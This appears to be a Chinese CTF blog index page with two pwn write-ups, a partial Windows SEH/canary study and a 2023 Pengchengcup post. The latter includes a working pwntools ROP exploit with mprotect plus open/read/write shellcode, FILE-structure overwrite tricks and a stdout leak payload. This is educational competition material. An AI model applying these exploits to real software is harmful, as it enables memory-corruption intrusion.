<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="CharonPt的Blog">
<meta property="og:url" content="https://github.com/CharonPt/CharonPt.github.io.git/index.html">
<meta property="og:site_name" content="CharonPt的Blog">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://github.com/CharonPt/CharonPt.github.io.git/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>CharonPt的Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">CharonPt的Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2024/01/30/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912024/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/01/30/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912024/" class="post-title-link" itemprop="url">西湖论剑2024</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-01-30 16:47:06" itemprop="dateCreated datePublished" datetime="2024-01-30T16:47:06+08:00">2024-01-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-05-10 13:43:29" itemprop="dateModified" datetime="2025-05-10T13:43:29+08:00">2025-05-10</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这次西湖3道pwn两道iot，pwn每题两三解、iot一道0解一道2解，感觉现在比赛的题目越来越难了，特别是大比赛</p>
<h1 id="babywin"><a href="#babywin" class="headerlink" title="babywin"></a>babywin</h1><p>一道Windows的pwn，也是我第一次接触，没有解出来，这里作复现学习和记录一下调试方法</p>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>在此之前是环境搭建，网上已经提到很多了，而且都是类似的</p>
<p>调试目前学的是<a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/07/09/winpwn/">clang师傅</a>的，用socat+IDA+pwntools去调，就是感觉每次IDA attach时都要搜索一下稍微有点麻烦</p>
<ol>
<li>先用socat架起来：<code>socat tcp-listen:8888,fork EXEC:EasyWinHeap.exe,pipes &amp;</code></li>
<li>然后pwntools直接remote过去</li>
<li>IDA里attach本地跑起来的题目进程：Debugger选<code>Local Windows debugger</code>，然后attach即可</li>
</ol>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Windows的保护相对于Linux要更多更复杂，github有个<a href="https://github.com/Wenzel/checksec.py">winchecksec</a>的项目，可以用它release的程序或者脚本，直接用程序就不用管脚本的依赖了，对题目程序执行结果如下</p>
<img src="/2024/01/30/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912024/image-20240130170205287.png" class="" title="image-20240130170205287">

<p>不知道为什么会尝试打开一些Linux的库文件，但是还是能看到程序的保护的</p>
<p>Windows的ASLR跟Linux不太一样，开启与否是由文件本身决定的，也就是说这题是有程序地址和栈地址的（堆还是变化的），且NX关闭，能打shellcode。这题主要是开了Canary和SafeSEH</p>
<h3 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h3><p>Windows的Canary跟Linux也有些不同，linux的Canary一般是在fs:0x28处，Windows的Canary保存在程序段</p>
<img src="/2024/01/30/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912024/image-20240130172122074.png" class="" title="image-20240130172122074">

<p>且会在main函数开始前初始化</p>
<img src="/2024/01/30/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912024/image-20240130172218898.png" class="" title="image-20240130172218898">

<h3 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h3><p>Windows对C/C++做的语法拓展，属于程序控制结构，用于处理异常事件（就像Linux用signal注册的异常处理函数）</p>
<h4 id="相关结构体"><a href="#相关结构体" class="headerlink" title="相关结构体"></a>相关结构体</h4><h5 id="TIB"><a href="#TIB" class="headerlink" title="TIB"></a>TIB</h5><h3 id="比赛时遇到的问题"><a href="#比赛时遇到的问题" class="headerlink" title="比赛时遇到的问题"></a>比赛时遇到的问题</h3><p>在main函数开始之前其实还有一大段代码，其中存在这个函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *__cdecl <span class="title">sub_401AD0</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v4; <span class="comment">// esp</span></span><br><span class="line">  <span class="keyword">void</span> *v6; <span class="comment">// [esp-18h] [ebp-18h]</span></span><br><span class="line">  _DWORD v7[<span class="number">2</span>]; <span class="comment">// [esp-8h] [ebp-8h] BYREF</span></span><br><span class="line">  <span class="keyword">void</span> *retaddr; <span class="comment">// [esp+0h] [ebp+0h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+4h] [ebp+4h]</span></span><br><span class="line"></span><br><span class="line">  v7[<span class="number">1</span>] = _except_handler4;</span><br><span class="line">  v7[<span class="number">0</span>] = NtCurrentTeb()-&gt;NtTib.ExceptionList;</span><br><span class="line">  v4 = alloca(a2);</span><br><span class="line">  v9 = <span class="number">-2</span>;</span><br><span class="line">  retaddr = v6;</span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>猜测是用来注册异常处理函数<code>_except_handler4</code>的，可以看到这个函数的逻辑明显跟canary的处理有关</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl _except_handler4(_DWORD *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4)</span><br><span class="line">&#123;</span><br><span class="line">  *a1 = _filter_x86_sse2_floating_point_exception_default(*a1);</span><br><span class="line">  <span class="keyword">return</span> except_handler4_common(&amp;__security_cookie, __security_check_cookie, a1, a2, a3, a4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我将栈上的canary覆盖之后按逻辑会走一个异常处理，应该是走上面这个，但是实际上发现走的是另外的一个结束方法，是下面这个函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __cdecl __noreturn __report_gsfailure()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// kr00_4</span></span><br><span class="line">  <span class="keyword">int</span> vars0; <span class="comment">// [esp+324h] [ebp+0h]</span></span><br><span class="line">  <span class="keyword">int</span> retaddr; <span class="comment">// [esp+328h] [ebp+4h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [esp+32Ch] [ebp+8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( IsProcessorFeaturePresent(<span class="number">0x17</span>u) )</span><br><span class="line">    __fastfail(<span class="number">2u</span>);</span><br><span class="line">  dword_403120 = <span class="number">0</span>;</span><br><span class="line">  dword_40311C = v4;</span><br><span class="line">  dword_403118 = v3;</span><br><span class="line">  dword_403114 = v0;</span><br><span class="line">  dword_403110 = v2;</span><br><span class="line">  dword_40310C = v1;</span><br><span class="line">  word_403138 = __SS__;</span><br><span class="line">  word_40312C = __CS__;</span><br><span class="line">  word_403108 = __DS__;</span><br><span class="line">  word_403104 = __ES__;</span><br><span class="line">  word_403100 = __FS__;</span><br><span class="line">  word_4030FC = __GS__;</span><br><span class="line">  v5 = __readeflags();</span><br><span class="line">  dword_403130 = v5;</span><br><span class="line">  dword_403124 = vars0;</span><br><span class="line">  dword_403128 = retaddr;</span><br><span class="line">  dword_403134 = (<span class="keyword">int</span>)&amp;v8;</span><br><span class="line">  dword_403070 = <span class="number">65537</span>;</span><br><span class="line">  dword_40302C = retaddr;</span><br><span class="line">  dword_403020 = <span class="number">-1073740791</span>;</span><br><span class="line">  dword_403024 = <span class="number">1</span>;</span><br><span class="line">  dword_403030 = <span class="number">1</span>;</span><br><span class="line">  dword_403034 = <span class="number">2</span>;</span><br><span class="line">  __raise_securityfailure((struct _EXCEPTION_POINTERS *)&amp;ExceptionInfo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中<code>IsProcessorFeaturePresent()</code>函数是用来确定当前计算机是否支持指定的处理器功能，0x17对应<strong>PF_FASTFAIL_AVAILABLE</strong>，表示<code>_fastfail()</code>可用，从名字可以看出来意思就是当<code>_fastfail()</code>可用的时候就会走这条路径进行快速的结束，在这条路径中不会调用前面提到的<code>_except_handler4()</code>。既然<code>IsProcessorFeaturePresent()</code>的结果是跟当前计算机有关系的，那么合理的猜测是远程靶机可能不会走<code>_fastfail()</code>，于是手动改一下跳转，让程序继续往下走，到<code>__raise_securityfailure()</code>，从名字可以看出这个也是一个异常处理相关的函数，如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">BOOL __cdecl __raise_securityfailure(struct _EXCEPTION_POINTERS *ExceptionInfo)</span><br><span class="line">&#123;</span><br><span class="line">  HANDLE CurrentProcess; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  SetUnhandledExceptionFilter(<span class="number">0</span>);</span><br><span class="line">  UnhandledExceptionFilter(ExceptionInfo);</span><br><span class="line">  CurrentProcess = GetCurrentProcess();</span><br><span class="line">  <span class="keyword">return</span> TerminateProcess(CurrentProcess, <span class="number">0xC0000409</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来就是我不太理解的地方了，即便我走这个路径，程序依然不会调用<code>_except_handler4()</code>，而是做了很多别的事情之后通过别的方式结束了程序（这部分在跟的时候没有试着去理解，是一个不太好的习惯）</p>
<p>在程序栈上面是能找到前面所述的那块结构的，而且其中的函数指针确实是这个函数，那么为什么最后还是不会调用它呢？</p>
<img src="/2024/01/30/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912024/image-20240130183521595.png" class="" title="image-20240130183521595">

<p>目前猜测是在那块异常处理函数中有某块逻辑没有满足，导致没有走<code>_except_handler4()</code></p>
<h5 id="目前进度到这里，后面的内容以后继续填坑"><a href="#目前进度到这里，后面的内容以后继续填坑" class="headerlink" title="目前进度到这里，后面的内容以后继续填坑"></a>目前进度到这里，后面的内容以后继续填坑</h5>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2023/11/06/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/06/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF/" class="post-title-link" itemprop="url">2023鹏城杯</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-11-06 08:10:47" itemprop="dateCreated datePublished" datetime="2023-11-06T08:10:47+08:00">2023-11-06</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-12-15 23:21:13" itemprop="dateModified" datetime="2023-12-15T23:21:13+08:00">2023-12-15</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Silent"><a href="#Silent" class="headerlink" title="Silent"></a>Silent</h1><p>普通的无泄漏栈溢出，沙箱只ban了execve，保护如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3ff000)</span><br></pre></td></tr></table></figure>

<p>程序逻辑如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">64</span>]; <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init_seccomp(argc, argv, envp);</span><br><span class="line">  alarm(<span class="number">0x1E</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最不用脑子的办法是用stdout爆破write然后orw，但是1/4096的概率确实要爆很久，所以做这题最开始时我是尝试去找gadget的，但是无奈找了半天找不到能用的链子，所以放弃了用爆破出的。</p>
<p>写这题的原因是赛后看<a target="_blank" rel="noopener" href="https://kagehutatsu.com/?p=951">影二师傅</a>是用的magic gadget，才发现ropper好像找不到magic gadget（也可能是我的方法有问题）</p>
<p>第一点是magic gadget基本在<code>__do_global_dtors_aux()</code>里，程序里确实有这个函数且gadget在里面，比赛时没注意这点</p>
<p>第二点是发现用ropper直接<code>search add</code>的话确实找不到这个gadget，但是用Ropgadget直接<code>grep add</code>能找到，除此之外Ropgadget找出来的add指令的数量是多过ropper的，所以下次应该先用Ropgadget？</p>
<p>补一下不用爆破的exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/charon/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc.so.6&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./silent&quot;</span>)</span><br><span class="line"><span class="comment">#0x00000000004007e8 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret</span></span><br><span class="line">gadget = <span class="number">0x00000000004007e8</span></span><br><span class="line">pop_rdi = <span class="number">0x400963</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x400961</span></span><br><span class="line">pop6 = <span class="number">0x40095A</span> <span class="comment"># rbx rbp r12 r13 r14 r15</span></span><br><span class="line">stdout = <span class="number">0x601020</span></span><br><span class="line">offset = -<span class="number">0x2dc670</span></span><br><span class="line">jmp_rbp = <span class="number">0x0000000000400a93</span> <span class="comment"># jmp qword ptr [rbp]</span></span><br><span class="line">pop_rbp = <span class="number">0x0000000000400788</span></span><br><span class="line">bss = <span class="number">0x601020</span> + <span class="number">0x500</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x0000000000400788&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">72</span> + flat(pop6, offset, stdout + <span class="number">0x3d</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, gadget)</span><br><span class="line">payload += flat(pop_rdi, <span class="number">1</span>, pop_rsi_r15, <span class="number">0x600FF0</span>, <span class="number">0</span>, pop_rbp, stdout, jmp_rbp)</span><br><span class="line">payload += flat(pop_rbp, bss+<span class="number">0x40</span>, <span class="number">0x4008DC</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">8</span>)) - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">mprotect = libc_base + libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">pop_rdx = libc_base + <span class="number">0x0000000000001b96</span></span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>) + shellcraft.read(<span class="number">3</span>, bss, <span class="number">0x50</span>) + shellcraft.write(<span class="number">1</span>, bss, <span class="number">0x50</span>))</span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += flat(<span class="number">0</span>, pop_rdi, <span class="number">0x601000</span>, pop_rsi_r15, <span class="number">0x1000</span>, <span class="number">0</span>, pop_rdx, <span class="number">7</span>, mprotect, bss)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>但是<a target="_blank" rel="noopener" href="https://kagehutatsu.com/?p=951">影二师傅</a>的exp里提到远程的偏移是测出来的，为<code>0x241b05</code>，这个数字跟本地的<code>0x2dc670</code>差得有点太多了，远程应该怎么测？这个点待填坑</p>
<h1 id="atuo-coffee-sale-machine"><a href="#atuo-coffee-sale-machine" class="headerlink" title="atuo_coffee_sale_machine"></a>atuo_coffee_sale_machine</h1><p>比赛时是用UAF打的bss段上的堆指针，<a target="_blank" rel="noopener" href="https://kagehutatsu.com/?p=951">影二师傅</a>wp里写的方法更简单些，打的stdout和stdin结构体实现泄露和任意地址写，这两个东西我用得很少，在这里记录下</p>
<blockquote>
<p>stdout修改flags为0xfbad1800以及IO_write_base地位实现泄漏libc地址</p>
<p>stdin修改flags为0xfbad1800以及IO_buf_base为任意写起点，IO_buf_end为终点，通过getchar进行读取</p>
</blockquote>
<p>用这种方法的前提是有IO函数，read和write是不走IO的，除此之外其他的都可以（大概），测试发现，<code>getchar</code>里面读取字节的长度是由<code>IO_buf_end - IO_buf_base</code>的值决定的，正常情况下这个值为1所以只读1个字节，在打stdin结构体时将这两个值做适当修改就可以实现任意地址任意字节写</p>
<h1 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h1><p>一道2.38版本的常规菜单堆，比赛时没来得及看，赛后复现时遇到些小坑，参考了[<a target="_blank" rel="noopener" href="https://blog.xmcve.com/2023/11/05/%E9%B9%8F%E5%9F%8E%E6%9D%AF2023-Writeup/#title-8">鹏城杯2023 Writeup - 星盟安全团队 (xmcve.com)</a>]</p>
<p>漏洞是off-by-one，add申请的size范围在<code>[0x400, 0x500]</code>，其实看到这个时就应该意识到这题是能从tcache里申请的，不完全是largebin的范围，所以这题其实可以tcache attack，而不是只能largebin attack。其余菜单edit、show、delete都全，用到了puts来输出，所以可以打stdout。</p>
<p>最开始复现的时候没注意到能打tcache，所以尝试用的largebin attack，2.38这个版本的diff我没看，但是在做的过程中能发现最大的变化在于unsorted bin在main_arena中的位置变了，从以前的<code>main_arena + 88</code>变成了<code>main_arena + 96</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: 0x5570b0df42b0 —▸ 0x7f9e1ea5bd00 (main_arena+96) ◂— 0x5570b0df42b0</span><br></pre></td></tr></table></figure>

<p>可以看到最低1字节是<code>\x00</code>，所以对于特定情况的libc泄露还是有比较大的影响的（例如对于在输入后面一定会加<code>\x00</code>，同时用puts这类函数来输出的题目来说）。那这种情况下（例如这题）就可能要考虑把UAF的chunk放到largebin里来泄露libc（这里也有一点点小坑是部分largebin的地址的最低字节也是<code>\x00</code>，所以在构造堆风水时最好考虑一下chunk的大小）</p>
<p>此外这题在最开始会给一个heap的地址，所以构造一个unlink是比较简单的。在看星盟这题的exp时发现一个自己忽略了好久的unlink构造，就是直接用两个相邻的chunk来触发unlink构造堆重叠，因为相邻的两个chunk是天然不会触发<code>corrupted size vs. prev_size while consolidating</code>这个的，所以在有堆地址的情况下就可以很简单地构造出一个UAF的chunk出来。</p>
<p>此外学到一个flat的写法<code>flat(&#123;0:heap_addr + 0x2b0, 8:heap_addr + 0x2b0, 0x400:0x410&#125;, filler=b&#39;\0&#39;)</code>，可以小小记录一下</p>
<p>还有就是打stdout泄露栈地址的payload：<code>flat([0x00000000fbad3887, 0, 0, 0, libc_addr + 0x206258, libc_addr + 0x206258 + 8, libc_addr + 0x206258 + 8, libc_addr + 0x206258 + 8])</code>，其中<code>libc_addr + 0x206258</code>是<code>environ</code>的地址，总得来说改掉<code>_IO_write_base</code>和<code>_IO_write_ptr</code>为想泄露内容的地址的区间就可以了，如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> p *stdout</span></span><br><span class="line"><span class="meta">$</span><span class="bash">1 = &#123;</span></span><br><span class="line">  _flags = -72533881,</span><br><span class="line">  _IO_read_ptr = 0x0,</span><br><span class="line">  _IO_read_end = 0x0,</span><br><span class="line">  _IO_read_base = 0x0,</span><br><span class="line">  _IO_write_base = 0x7ff667073258 &lt;environ&gt; &quot;\370\&quot;\331 \377\177&quot;,</span><br><span class="line">  _IO_write_ptr = 0x7ff667073260 &lt;ttyname_buf&gt; &quot;&quot;,</span><br><span class="line">  _IO_write_end = 0x7ff667073260 &lt;ttyname_buf&gt; &quot;&quot;,</span><br><span class="line">  _IO_buf_base = 0x7ff667073260 &lt;ttyname_buf&gt; &quot;&quot;,</span><br></pre></td></tr></table></figure>

